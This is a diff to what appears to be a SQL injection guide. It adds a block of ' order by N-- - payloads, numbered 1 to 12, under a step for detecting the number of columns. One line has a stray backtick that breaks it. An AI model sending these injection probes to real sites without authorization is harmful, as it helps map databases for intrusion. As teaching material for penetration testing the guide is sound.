@@ -94,6 +94,22 @@ Data types from each column MUST be the same, and the number of columns in each 
 1. Detect number of columns
 
 - Use the function ORDER BY until there is an error that says a column does not exist
+```
+' order by 1-- -
+' order by 2-- -
+' order by 3-- -
+' order by 4-- -
+' order by 5-- -
+' order by 6-- -
+ `order by 7-- -
+' order by 8-- -
+' order by 9-- -
+' order by 10-- -
+' order by 11-- -
+' order by 12-- -
+```
+
+
 
 2. Determine injection location
 
